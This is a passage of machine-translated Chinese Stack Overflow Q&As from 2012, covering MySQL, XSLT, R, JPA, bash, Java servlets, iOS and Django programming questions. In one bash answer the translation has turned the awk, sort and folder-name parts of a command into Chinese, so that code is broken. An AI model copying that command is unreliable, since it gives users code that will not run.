我不熟悉 Bottle，但在使用 Django 时确实遇到了同样的问题。我的解决方案是将 Python 列表转储为 JSON 格式。Javascript 对 JSON 很满意。

```
myList = [1, 2, 3, '字符串', "&apm;", '"']

```

然后返回`simplejson.dumps(myList)`您的网页。在js中：

```
var myList = <dumped-literal-JSON-string>

```

注意：不要用引号将转储的 JSON 值括起来。

# mysql - mysql - 如何使用特殊字符 %(percent) 和 _(underscore) 处理查询搜索

> ID：11427419
> 
> 赞同：0
> 
> 时间：2012-07-11T07:13:19.650
> 
> 标签：mysql

我的数据库中有 2 条记录，**`Tom%Jerry`**并且**`Ninja_Kids`**. 一个有一个特殊字符 %（百分比），另一个有 _（下划线）。我在 mysql 终端中尝试了以下命令。

```
SELECT * FROM CUSTOMER WHERE NAME LIKE '%%%';
SELECT * FROM CUSTOMER WHERE NAME LIKE '%_%'; 
```

这两个命令都返回了所有记录。

我将如何使这些返回具有`%`or的记录`_`。

我知道它`%`在 mysql 中像保留字一样使用，但是如果记录包含上述特殊字符怎么办。

顺便说一句，除了 2 你知道其他不正常的特殊字符吗？

请帮忙。提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:15:03.753

你需要逃脱`%`和`_`。[文档](http://dev.mysql.com/doc/refman/5.6/en/string-literals.html)。_

```
SELECT * FROM CUSTOMER WHERE NAME LIKE '%\%%';
SELECT * FROM CUSTOMER WHERE NAME LIKE '%\_%'; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:14:46.343

之前尝试使用转义字符（），例如：-

```
select * from table where column like '\%\_' 

to match for string '%_' 
```

# objective-c - UIStepper 断言失败

> ID：11427426
> 
> 赞同：0
> 
> 时间：2012-07-11T07:13:36.820
> 
> 标签：objective-c, xcode, cocoa-touch, interface-builder

我正在研究 Xcode 4.3.3 并尝试将 UIStepper 与界面生成器一起使用。尝试设置最小值 = 0、最大值 = 10,000、步长值 = 100 和当前值 = 5000。我收到以下编译时错误 -

```
DVTAssertions: ASSERTION FAILURE in /SourceCache/IDEInterfaceBuilderCocoaTouch/IDEInterfaceBuilderCocoaTouch-1181/IBPlugin/WidgetIntegration/IBUIStepper/IBUIStepper.m:41
Details:  Assertion failed: aValue <= maximumValue && aValue >= minimumValue
Object:   <IBUIStepper: 0x40086e000>
Method:   -setValue:
Thread:   <NSThread: 0x40010a260>{name = (null), num = 1}
Hints: None
Backtrace:............. 
```

我不知道该怎么做，在谷歌上一无所获。有人有类似的错误或对此有任何想法吗？

# android - Android ExpandableListView 中的“int groupPosition”是什么？

> ID：11427429
> 
> 赞同：0
> 
> 时间：2012-07-11T07:13:42.940
> 
> 标签：android

在设置监听器时，我有需要获取 groupItem 视图的方法。我如何通过 onGroupExpand 的方法来做到这一点：

```
 list.setOnGroupExpandListener(new OnGroupExpandListener() { 

        @Override 
        public void onGroupExpand(int groupPosition) { 

        } 
    }); ` 
```

我需要 groupItem 的视图。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:31:19.490

在您的适配器内，您可以添加以下方法：

```
public View getGroupView(int grpPosition, ...) {
  return myGroupCollection.get(grpPosition);
} 
```

调用 onGroupExpand 方法时，您可以从 Adapter 询问视图：

```
list.setOnGroupExpandListener(new OnGroupExpandListener() { 

    @Override 
    public void onGroupExpand(int groupPosition) { 
         View v = myAdapter.getGroupView(groupPosition).findBy....
         // Do other stuff you like
    } 
}); 
```

# javascript - Jquery 浏览器滚动问题

> ID：11427431
> 
> 赞同：0
> 
> 时间：2012-07-11T07:13:48.050
> 
> 标签：javascript, jquery, height, scrollbar

我想测试一个网页是否有一个垂直滚动条来在页面底部添加一些填充像素，以便在底部有某个框时固定位置。问题是，当我测试文档的高度与返回的窗口高度相等时，body 标记的高度也返回 0（body 的高度是动态的，未设置）。下面的函数也不能正常工作：

```
function hasScroll(el, direction) {
direction = (direction === 'vertical') ? 'scrollTop' : 'scrollLeft';
var result = !! el[direction];
if (!result) {
el[direction] = 1;
result = !!el[direction];
el[direction] = 0;
}
return result;
} 
```

和

```
(function($){
$.fn.hasScrollBar = function(){ return this.get(0).scrollHeight > this.innerHeight();}
})(jQuery); 
```

CSS主体设置为：

```
body{
font-family:'DINRegular';
margin:0 auto;
padding:0;
font-size:13px;
color:#000;
} 
```

尽管页面中存在滚动条，但它始终返回 false。

谢谢你的建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T09:21:43.040

您需要在文档首次加载时检查垂直滚动条，然后在调整窗口大小时检查。所以这是一个粗略的例子。

```
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
<script>
$(document).ready(function() {  
var hasScrollbar = $('body').outerHeight()+16 > $(window).height();
if(hasScrollbar){ 
$('#message').show();
} else {
$('#message').hide();
};
}); 
$(window).resize(function() {
var hasScrollbar = $('body').outerHeight()+16 > $(window).height();
if(hasScrollbar){ 
$('#message').show();
} else {
$('#message').hide();
};
});
</script>
<div style="width:600px;height:600px;border:1px solid blue;">
test -
<div id="message" style="display:none;">has vertical scrollbar</div>
</div> 
```

# xml - XSLT：从 xml 生成 csv，其中有多次出现的标签复杂场景

> ID：11427433
> 
> 赞同：0
> 
> 时间：2012-07-11T07:13:49.183
> 
> 标签：xml, xslt

对于这个 xml：

```
 <G>
        <P>
            <A>
                <b>value b</b>
                <c>value c</c>
            </A>
            <A>
                <b>value b2</b>
                <c>value c2</c>
            </A>
            <D>value ew</D>
        <D>value e2</D>     
            <E>value f</E>
        </P>
        <P>
            <A>
                <b>value bx</b>
                <c>value cx</c>
            </A>
            <A>
                <b>value b2x</b>
                <c>value c2x</c>
            </A>
             <D>value exw</D>
        <D>value ex2</D>

         <D>value ex2</D>
            <E>value fx</E>
        </P>
    </G> 
```

像 A 和 D 这样的标签可以出现多次，我正在处理的原始 xml 有大量标签，其中许多标签多次出现。我必须生成输出为：
值 b 值 c 值 ew 值 f
值 b 值 c 值 e2 值 f
值 b2 值 c2 值 ew 值 f
值 b2 值 c2 值 e2 值 f
值 bx 值 cx 值 exw 值 fx
值 bx 值cx 值 ex2 值 fx
值 bx 值 cx 值 ex3 值 fx
值 b2x 值 c2x 值 exw 值 fx
值 b2x 值 c2x 值 ex2 值 fx
值 b2x 值 c2x 值 ex3 值 fx

如果 A 标记多次出现，则此 xslt 生成正确的输出，但是当上述 xml 中的其他标记（如 D 重复）时，此操作不起作用。

```
<xsl:for-each select="//A">
    <xsl:value-of select="b"/>
    <xsl:text>,</xsl:text>
    <xsl:value-of select="c"/>
    <xsl:text>,</xsl:text>
    <xsl:value-of select="ancestor::P/D"/>
    <xsl:text>,</xsl:text>
    <xsl:value-of select="ancestor::P/E"/>
    <xsl:text>  
</xsl:text>
</xsl:for-each> 
```

请建议正确的 xslt

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:42:40.077

这是一个可能的解决方案：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:output method="text"/>
    <xsl:variable name='s' select='","' />
    <xsl:template match="A">
        <xsl:variable name='b' select='b' />
        <xsl:variable name='c' select='c' />
        <xsl:for-each select="../D"><xsl:value-of select='$b' /><xsl:value-of select='$s' /><xsl:value-of select='$c' /><xsl:value-of select='$s' /><xsl:value-of select='.'/><xsl:value-of select='$s' /><xsl:value-of select='../E'/><xsl:text>
</xsl:text></xsl:for-each>
    </xsl:template>
    <xsl:template match="text()" />
</xsl:stylesheet> 
```

请注意，它会查找所有 A，并为每个 A 为 A 的每个 D 兄弟输出一行。请注意，请确保这是您想要的

它给出了输出：

```
value b,value c,value ew,value f
value b,value c,value e2,value f
value b2,value c2,value ew,value f
value b2,value c2,value e2,value f
value bx,value cx,value exw,value fx
value bx,value cx,value ex2,value fx
value bx,value cx,value ex2,value fx
value b2x,value c2x,value exw,value fx
value b2x,value c2x,value ex2,value fx
value b2x,value c2x,value ex2,value fx 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:54:43.473

我认为这可以通过重复调用模板来实现。首先，您有一个匹配**A**的模板，但不是输出**b**和**c**元素，而是将它们作为参数传递给与 D 元素匹配的**模板**

```
<xsl:template match="A">
  <xsl:apply-templates select="following-sibling::D">
     <xsl:with-param name="prefix">
        <xsl:value-of select="b"/>
        <xsl:text>,</xsl:text>
        <xsl:value-of select="c"/>
     </xsl:with-param>
  </xsl:apply-templates>
</xsl:template> 
```

然后，在与**D**元素匹配的模板中，将前缀与 D 的值连接起来，并将其传递给与**E**元素匹配的模板。

```
<xsl:template match="D">
  <xsl:param name="prefix"/>
  <xsl:apply-templates select="following-sibling::E">
     <xsl:with-param name="prefix">
        <xsl:value-of select="$prefix"/>
        <xsl:text>,</xsl:text>
        <xsl:value-of select="."/>
     </xsl:with-param>
  </xsl:apply-templates>
</xsl:template> 
```

**然后匹配E**元素的模板可以输出整个字符串。这是完整的 XSLT

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:output method="text" indent="yes"/>

   <xsl:template match="/">
      <xsl:apply-templates select="//A"/>
   </xsl:template>

   <xsl:template match="A">
      <xsl:apply-templates select="following-sibling::D">
         <xsl:with-param name="prefix">
            <xsl:value-of select="b"/>
            <xsl:text>,</xsl:text>
            <xsl:value-of select="c"/>
         </xsl:with-param>
      </xsl:apply-templates>
   </xsl:template>

   <xsl:template match="D">
      <xsl:param name="prefix"/>
      <xsl:apply-templates select="following-sibling::E">
         <xsl:with-param name="prefix">
            <xsl:value-of select="$prefix"/>
            <xsl:text>,</xsl:text>
            <xsl:value-of select="."/>
         </xsl:with-param>
      </xsl:apply-templates>
   </xsl:template>

   <xsl:template match="E">
      <xsl:param name="prefix"/>
      <xsl:value-of select="$prefix"/>
      <xsl:text>,</xsl:text>
      <xsl:value-of select="."/>
      <xsl:value-of select="'&#13;'"/>
   </xsl:template>
</xsl:stylesheet> 
```

应用于您的 XML 示例时，将输出以下内容

```
value b,value c,value ew,value f
value b,value c,value e2,value f
value b2,value c2,value ew,value f
value b2,value c2,value e2,value f
value bx,value cx,value exw,value fx
value bx,value cx,value ex2,value fx
value bx,value cx,value ex2,value fx
value b2x,value c2x,value exw,value fx
value b2x,value c2x,value ex2,value fx
value b2x,value c2x,value ex2,value fx 
```

# r - 如何创建行名变量？

> ID：11427434
> 
> 赞同：12
> 
> 时间：2012-07-11T07:13:53.420
> 
> 标签：r

我在 R 中有一个如下所示的对象：

```
 returns   
2010-1-4    -0.015933327              
2010-1-11   -0.015042868    
2010-1-18    0.005350297  
2010-1-25   -0.049324703    
2010-2-1    -0.052674121 
```

我想把它变成：

```
 date       returns             
1 2010-01-04 -0.0159333272          
2 2010-01-11 -0.0150428685        
3 2010-01-18  0.0053502965        
4 2010-01-25 -0.0493247026       
5 2010-02-01 -0.0526741206 
```

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-07-11T07:22:13.610

根据您的数据集创建一个新列`rownames`：

```
# Read in your example data
DF = read.table(header=TRUE, text=" returns
2010-1-4 -0.015933327
2010-1-11 -0.015042868
2010-1-18 0.005350297
2010-1-25 -0.049324703
2010-2-1 -0.052674121")
DF
#                returns
# 2010-1-4  -0.015933327
# 2010-1-11 -0.015042868
# 2010-1-18  0.005350297
# 2010-1-25 -0.049324703
# 2010-2-1  -0.052674121

# Create a `date` variable
DF$date = rownames(DF)
# Reset the `rownames` of your original data
rownames(DF) = NULL
# Format the `date` variable properly
DF$date = strptime(DF$date, "%Y-%m-%d")
DF
#        returns       date
# 1 -0.015933327 2010-01-04
# 2 -0.015042868 2010-01-11
# 3  0.005350297 2010-01-18
# 4 -0.049324703 2010-01-25
# 5 -0.052674121 2010-02-01 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-11T07:25:43.830

很模糊的问题。但是例如，您可以使用重命名列

```
colnames(data) <- c('date','returns') 
```

如果您需要带有顺序编号的第一列，请尝试以下操作：

```
data <- cbind(1:nrow(data), data) 
```

如果您只需要行号：

```
row.names(data) <- 1:nrow(data) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T10:06:03.953

你可以简单地这样做：

```
date <- t(as.data.frame(strsplit(as.character(weekly.returns),split=" ")))[,1]
returns <- t(as.data.frame(strsplit(as.character(weekly.returns),split=" ")))[,2] 
```

data.frame(date,returns,row.names=NULL) 它会给你这个：

```
 date     returns
1 2010-01-08 -0.07830343
2 2010-01-15 -0.05176991
3 2010-01-22  0.07699487
4 2010-01-29 -0.05979203
5 2010-02-01 -0.02119816 
```

# java - 如何在 Java SE 应用程序中管理两个持久性单元

> ID：11427436
> 
> 赞同：1
> 
> 时间：2012-07-11T07:13:59.113
> 
> 标签：java, jpa, eclipselink

我们开发了一个在两个持久性单元上工作的应用程序。应用程序从一个 PU1 中检索实体并循环处理它们。

在这个循环中，它更新 PU2 的记录，最后更新 PU1 实体并将它们标记为已处理。

它工作正常，但问题是我必须为 PU1 实体的每次遍历开始/提交 PU2，因此我们面临性能问题。

```
try{
em1.getTransaction.begin();
Query query = em1.createNamedQuery("Request.SELECT_ALL");
query.setMaxResults(1000);
List<LoaneeRefill> requests = query.getResultList();

for (Request vo : requests) {

 em2.getTransaction.begin();

 Response r =new Resopnse();
 r.setNumber(vo.getNumber);

 em2.persist(r);

 em2.getTransaction.commit();

 vo.setStatus("Y");
 em1.merge(vo);
 }

 em1.getTransaction.commit();
 }catch(Exception e){} 
```

上面的代码导致性能问题/在大量请求上花费大量时间。

我尝试了以下代码，但出现错误：

```
 try{
 em1.getTransaction.begin();
 em2.getTransaction.begin();

 Query query = em1.createNamedQuery("Request.SELECT_ALL");
 query.setMaxResults(1000);
 List<LoaneeRefill> requests = query.getResultList();

 for (Request vo : requests) {

 Response r =new Resopnse();
 r.setNumber(vo.getNumber);

 em2.persist(r);

 vo.setStatus("Y");
 em1.merge(vo);
 }

 em2.getTransaction.commit();
 em1.getTransaction.commit();
 }catch(Exception e){} 
```

错误：

```
javax.persistence.PersistenceException: Exception [EclipseLink-7197] (Eclipse Persistence Servi
ces - 2.1.1.v20100817-r8050): org.eclipse.persistence.exceptions.ValidationException
Exception Description: Null or zero primary key encountered in unit of work clone 
```

编辑：

如果我从 PU1 获得实体列表并将它们分离，有什么建议。然后处理这些请求并使用一种更新或任何其他方式更新列表。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:29:20.493

这取决于您如何在数据库中生成 ID。如果它们是通过数据库上的自动增量生成的，那么以下信息可能是您获得更好性能的唯一选择。

如果您有另一个 ID 系统，或者可以更改您的 ID 生成方式，请查看[此处](http://en.wikibooks.org/wiki/Java_Persistence/Identity_and_Sequencing)以获取有关如何使用表格或序列生成 ID 的更多信息，以及这两个系统的优点和缺陷。

* * *

在 for 循环结束时，尝试添加...

```
em2.flush(); 
```

原因是 JPA 实际上并没有将更改提交到提交行的数据库单元。因此，尚未设置 ID。（我认为它在那里为占位符添加了一个 0）并且当您尝试保留第二个项目而不提交第一个项目时，它最终会得到具有相同占位符 ID 的第二个记录。

刷新将实际执行 SQL 以实际将记录添加到数据库并获取创建的真实 ID，但会使事务保持打开状态，因此您应该会看到性能提升。

似乎持久性 API 应该足够聪明，可以一次处理多个新记录，但这不是我的经验，可能有一个很好的理由，但我不知道它是什么。

* * *

# linux - 在 *nix cd 命令中将目录更改为最后一个匹配项

> ID：11427438
> 
> 赞同：2
> 
> 时间：2012-07-11T07:14:01.937
> 
> 标签：linux, bash, unix, sh, cd

```
./
  folder_1
  folder_2
  folder_3
  ...
  folder_46 
```

第一场比赛 -> **cd folder_*** -> folder_1

但是最后一场比赛该怎么办（folder_46）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-11T07:29:02.300

试试这个：

```
cd `ls -rd folder_*` 
```

总是有一个更短的代码:)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-11T11:09:30.707

`ls`不适合这种用途。您可以使用文件通配符和数组：

```
dirs=(folder_*/); cd "${dirs[@]: -1}" 
```

glob 保证按词法顺序扩展。数组切片访问数组的最后一个成员。

您可以创建一个自动删除数组的函数：

```
cdl () { declare -a dirs=(${1:-folder_}*/); cd "${dirs[@]: -1}"; } 
```

这默认为“folder_”的前缀，但它会接受一个参数来使用另一个前缀：

```
cdl dirname- 
```

`declare`在函数内部使变量成为函数的局部变量。

如果您使用的是 Bash 4.2，则可以直接访问最后一个数组元素，而不是像上面那样使用切片：

```
cd "${dirs[-1]}" 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T07:24:25.203

试试这个

> cd `ls -ld 文件夹_* | awk '{打印 $9}' | 排序 | sed -e '$!d'`

但是我想您必须将文件夹命名为 folder_01, folder_02 而不是 folder_1, folder_2, ...

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-11T08:00:12.567

```
cd $(find . -maxdepth 1 -type d -name "folder_*" | sort -t_ -k2 -n -r | head -1) 
```

即使在目录太多的情况下也可以使用（`ls`会因`too many arguments`错误而死。并且它适用于`folder_1`......`folder_[any_number]`你不需要重命名`folder_1`为`folder_01`or`folder_001`等​​等。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-12T07:08:16.830

```
cdlast() { cd "${!#}"; }

cdlast folder_* 
```

# c++ - 子对象和包含对象之间的区别

> ID：11427439
> 
> 赞同：3
> 
> 时间：2012-07-11T07:14:06.823
> 
> 标签：c++, inheritance, containment

*子对象*和*包含对象*有什么区别？为了构造从另一个类派生的类的实例，首先必须创建子对象，然后必须创建派生对象。

问题：

1.  派生对象是否包含子对象？

2.  如何可视化对象结构的差异

    a) 其中包含另一个对象

    b) 派生自另一个类

    a) 和 b) 中的对象是否具有相同的结构？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-11T07:37:19.550

是的，派生对象包含其基类子对象的实例。

从物理上讲，包含对象（作为成员）和从对象派生之间实际上没有区别。此外，该语言将两者都称为*子对象*：基类子对象和成员子对象。

虚拟继承通常会引入一些额外的家庭数据，这使得它比仅仅“包含”一个基础子对象更加复杂，但普通继承通常归结为简单的“包含”。

派生和包含成员之间的区别实际上仅存在于概念级别。不同的访问语法，不同的功能。例如，涉及到多态等语言特征的派生。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-11T08:43:08.977

在 C++ 中，区别在于虚方法。派生类可以重新定义基本子对象虚拟方法。包含的对象保持原样。这或多或少是基里尔的回答——但我希望答案更简单一些。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-11T07:31:52.517

是的，派生对象包含子对象。这么说也没错。虽然推导有点多。可以直接访问数据成员和方法。虚函数占用 VMT 中的插槽。当对象被包含时，这一切都不会发生。

可视化差异。没有普遍接受的方法来做到这一点。从内存布局的角度来看，区别在于 VMT。包含的对象有自己的 VMT 字段（如果有的话）。派生对象有自己的 VMT，它是通过添加新条目和替换一些条目从基础对象的 VMT 中创建的。

# java - getClass().getResource() 在部署中返回 null

> ID：11427443
> 
> 赞同：2
> 
> 时间：2012-07-11T07:14:19.513
> 
> 标签：java, swing, icons, getresource

当我从 netbeans 运行应用程序时，以下代码运行良好

```
ThumbnailLabel lblImg =new ThumbnailLabel(new javax.swing.ImageIcon(
    getClass().getResource("/jewelleryerpapplication/GUI/resources/NoPicture.png"))); 
```

然后我清理构建解决方案，如针对此问题的不同帖子中所述。之后，当我从 dist 文件夹中双击 App.jar 时，会发生以下异常。

```
 Exception in thread "AWT-EventQueue-0" java.lang.NullPointerException
    at javax.swing.ImageIcon.<init>(ImageIcon.java:138) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:22:40.463

验证您的部署 JAR 是否确实包含图像 :-)

# java - 过滤器：客户端和服务器端重定向

> ID：11427445
> 
> 赞同：3
> 
> 时间：2012-07-11T07:14:20.697
> 
> 标签：java, servlets, servlet-filters

那是我的过滤器：

```
public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)
        throws java.io.IOException, javax.servlet.ServletException
{
    HttpServletRequest request = (HttpServletRequest) servletRequest;
    HttpServletResponse response = (HttpServletResponse) servletResponse;
    String currentURL = request.getRequestURI();
    MaintenanceService maintenanceMode = new MaintenanceService();

    if (maintenanceMode.getMaintenanceMode())
    {
        String urlNew = currentURL.concat("maintenance.jsp");
        response.sendRedirect(urlNew);

    }
    filterChain.doFilter(servletRequest, servletResponse);
} 
```

“在”maintenanceMode.getMaintenanceMode() 下，我有变量 getter：

```
boolean maintenanceMode = Boolean.getBoolean("maintenance"); 
```

使用*转发*（服务器端重定向）它可以正常工作，当我尝试客户端重定向时：

```
response.sendRedirect(urlNew); 
```

我得到了一个无限出现的maintenance.jsp连接：

```
http://localhost:8080/maintenance.jspmaintenance.jspmaintenance.jspmaintenance.jspmaintenance.jsp 
```

为什么它没有重定向到一个事件，例如服务器端重定向：

```
http://localhost:8080/maintenance.jsp 
```

Web.xml 过滤器映射：

```
<filter-mapping>
    <filter-name>maintenanceFilter</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:37:23.090

发生这种情况是因为您正在重定向所有 URL，包括`maintenance.jsp`. 它导致无限重定向。

将重定向条件修改为仅当当前 url 不是时才重定向`maintenance.jsp`。

**以下是我更改后代码的外观：**

```
public void doFilter(ServletRequest servletRequest,ServletResponse servletResponse,
      FilterChain filterChain)
    throws java.io.IOException, javax.servlet.ServletException
{
   HttpServletRequest request = (HttpServletRequest) servletRequest;
   HttpServletResponse response = (HttpServletResponse) servletResponse;
   String currentURL = request.getRequestURI();
   MaintenanceService maintenanceMode = new MaintenanceService();
   if (!currentURL.equals("/maintenance.jsp") 
            && maintenanceMode.getMaintenanceMode())
   {
    String urlNew = currentURL.concat("maintenance.jsp");
    response.sendRedirect(urlNew);
   }
   filterChain.doFilter(servletRequest, servletResponse);
} 
```

我不明白你为什么要`String urlNew = currentURL.concat("maintenance.jsp");` 为每个 url 做。您是否有`maintenance.jsp`与每个网址相关的页面。我认为你应该只有一个`/maintenance.jsp`页面。`response.sendRedirect(/maintenance.jsp)`在这种情况下，无论您访问的页面如何，都必须始终重定向到。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:28:13.603

```
<filter-mapping>
<filter-name>maintenanceFilter</filter-name>
<url-pattern>/*</url-pattern> 
```

在过滤器映射中，您的所有请求（它们是被重定向的新请求）都符合此条件，这`filter`就是您的过滤器在每个请求上被无限次调用的原因。

一种方法是您可以将此过滤器称为特定的`url-pattern`

# objective-c - 如何在ios中获取接入点的mac地址？

> ID：11427449
> 
> 赞同：3
> 
> 时间：2012-07-11T07:14:40.643
> 
> 标签：objective-c, ios, wireless, access-point

我想获得一些关于接入点的独特信息。比如MAC地址和强度。我尝试在目标 c 中用最多三个强度的无线接入点做三角形。我有 xcode 4.3.2 和 ios 5.1。我怎样才能在 ios 中做到这一点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T18:59:12.407

看[那里](https://stackoverflow.com/questions/1460540/how-do-i-get-the-current-access-points-mac-address-bssid)

尝试这个 ：

```
CFArrayRef myArray = CNCopySupportedInterfaces();
CFDictionaryRef captiveNetWork = CNCopyCurrentNetworkInfo(CFArrayGetValueAtIndex(myArray, 0));
NSLog(@"Connected at : %@", captiveNetWork);
NSDictionary *myDictionnary = (__bridge NSDictionary *)captiveNetWork;
NSString *bssid = [myDictionnary objectForKey:@"BSSID"];
NSLog(@"BSSID : %@", bssid); 
```

# javascript - 将 JSON 值存储在 javascript 数组中

> ID：11427451
> 
> 赞同：1
> 
> 时间：2012-07-11T07:14:42.960
> 
> 标签：javascript, json

我正在使用 JSON 值存储在 javascript 数组中。

我的 JSON 值：

```
"Users":[{"user_name":"User 1","id":1,"image_url":"/photos/list/missing.png","level":1,"position":{"name":"User ABC","description":"desc"}}] 
```

我收到与上述相同的警报响应。代码：

```
alert("Response : " + $.toJSON(res["Users"])); 
```

O/P : 响应 : [{"user_name":"User 1","id":1,"image_url":"/photos/list/missing.png","level":1,"position":{" name":"User ABC","description":"desc"}}]

将此值存储为代码：

```
tempJSON = $.toJSON(res["Users"]); 
```

`alert("JSON Array : " + tempJSON.length);` `alert("Name : " + tempJSON[0]. user_name);`

O/P：JSON 数组：132 -> 字符数。名称：未定义。-> 因为它找不到“user_name”的值

如果我将此值存储为简单字符串。代码：

```
tempJSON = [{"user_name":"User 1","id":1,"image_url":"/photos/list/missing.png","level":1,"position":{"name":"User ABC","description":"desc"}}]; 
```

`alert("JSON Array : " + tempJSON.length);` `alert("Name : " + tempJSON[0]. user_name);`

然后准确地说，

开/关：

JSON 数组：1 -> 数组数量。

名称：用户 1

我不明白发生了什么。请告诉我任何解决方案。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:25:11.883

我认为问题是

```
tempJSON = $.toJSON(res["Users"]); 
```

=> 你在 tempJSON 变量中得到一个字符串，而不是对象！

也许使用 firebug 或任何其他开发人员工具来调试您的 JS。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T12:22:48.593

在获取 tempJSON 中的值时，您没有将对象转换为 JSON(String)。相反，您尝试以下代码：-

```
var tempJSON = res["Users"]; 
```

供您参考：-[在这里试试](http://jsfiddle.net/jigneshparmar/vC89A/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-14T12:38:28.903

它被认为是一个字符串

代码 ：：

```
var tempJSON = $.toJSON(res.Users[0]); 
```

它正在工作。

享受编码。
谢谢。

# mysql - MySQL中IF语句的正确语法是什么？

> ID：11427457
> 
> 赞同：8
> 
> 时间：2012-07-11T07:14:57.263
> 
> 标签：mysql, syntax, if-statement

我有一个小而简单的 MySQL 代码。但是每当我运行它时，我都会收到错误 #1064。你能告诉我我的错误是什么吗？

```
IF ((SELECT COUNT(id) FROM tbl_states) > 0) THEN
    BEGIN
        SELECT * FROM tbl_cities;
    END
END IF 
```

我还使用了一些其他条件，例如下面的条件，但我又遇到了错误。

```
IF (1=1) THEN
    BEGIN
        SELECT * FROM tbl_cities;
    END
END IF 
```

我真正想做的是这样的：

```
IF ((SELECT COUNT(id) FROM tbl_states) > 0) THEN
    BEGIN
        UPDATE ...
    END
ELSE
    BEGIN
        INSERT ...
    END
END IF 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-11T07:21:03.290

如果这是您正在编写的程序，您应该尝试：

```
BEGIN
    IF ((SELECT COUNT(id) FROM tbl_states) > 0) THEN
        SELECT * FROM tbl_cities;
    END IF
END 
```

如果是查询，`BEGIN`和`END`这里无关。

**编辑**

好吧，其实没什么好说的，`IF ((SELECT COUNT(id) FROM tbl_states) > 0) THEN SELECT * FROM tbl_cities; END IF`就是不尊重基本的 MySQL [SELECT 语句](http://dev.mysql.com/doc/refman/5.0/en/select.html)。

你应该从`SELECT`...等开始

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-11T07:20:46.590

我想你只需要这个：

```
SELECT * FROM tbl_cities WHERE EXISTS (SELECT * FROM tbl_states) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T07:27:58.517

可能这有帮助：

```
SELECT * FROM tbl_cities WHERE (SELECT count(1) FROM tbl_states)>0 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-11T07:33:14.697

```
SELECT *  FROM test2 where (select count(*) from test) > 0; 
```

这里需要使用[CASE](http://dev.mysql.com/doc/refman/5.0/en/case-statement.html)来创建条件执行..试试这个..

```
CASE WHEN ((SELECT COUNT(id) FROM tbl_states) > 0) THEN
    BEGIN
        UPDATE ...
    END
ELSE
    BEGIN
        INSERT ...
    END
END 
```

# python - 在 Django 中为 ModelChoiceField 使用后向关系（即 FOO_set）

> ID：11427463
> 
> 赞同：1
> 
> 时间：2012-07-11T07:15:22.047
> 
> 标签：python, django

我有一个名为 Movie 的模型，它有一个名为 Director 的 ManyToManyField 到一个名为 Person 的模型，我正在尝试使用 ModelChoiceField 创建一个表单，如下所示：

```
class MovieSearchForm(forms.Form):
    producer = forms.ModelChoiceField(label='Produced by',
                                      queryset=movies.models.Person.producer_set,
                                      required=False) 
```

但这似乎无法编译（我得到了使用表单的视图的 ViewDoesNotExist 异常，但如果我只是用所有人员对象替换查询集，它就会消失），我猜是因为'.producer_set'评估得太早了。我怎样才能得到这份工作？

以下是电影/人物类的相关部分：

```
class Person(models.Model):
    name = models.CharField(max_length=100)

class Movie(models.Model):
    ...
    producer = models.ForeignKey(Person, related_name="producers")
    director = models.ForeignKey(Person, related_name="directors") 
```

我想要做的是让曾经在某些电影的制片人领域使用过的人。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T08:08:11.137

我写了一条评论，要求提供更详细的描述，但这里有一些提示可以让你走上正轨：

1）您应该`.all()`在语句的末尾添加。

2）您应该`objects`在模型和字段之间的语句中添加使用或其他一些管理器。

3）您正在查询一个人的 producer_set。从逻辑上讲，我假设您应该为这样的制片人查询电影模型（取决于您的模型和用例）`queryset=movies.models.Movie.objects.producers.all()`：

# openerp - 在 openerp 中删除日志消息

> ID：11427470
> 
> 赞同：0
> 
> 时间：2012-07-11T07:15:45.697
> 
> 标签：openerp

如何删除 openerp 中的采购异常日志消息？例如![在此处输入图像描述](../Images/18740fb645cc5f21e4c295fbb5b698bd.png)

在这里我只是不想显示采购异常。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T09:55:22.007

我得到了它。`_check_make_to_stock_product()`从采购中继承功能，然后`'res.log'`用域搜索模型`[('res_model','=',self._name),('res_id','='our_procurement_id,)]` 然后取消链接。就是这样 ：）

# html - 不能在表内工作？

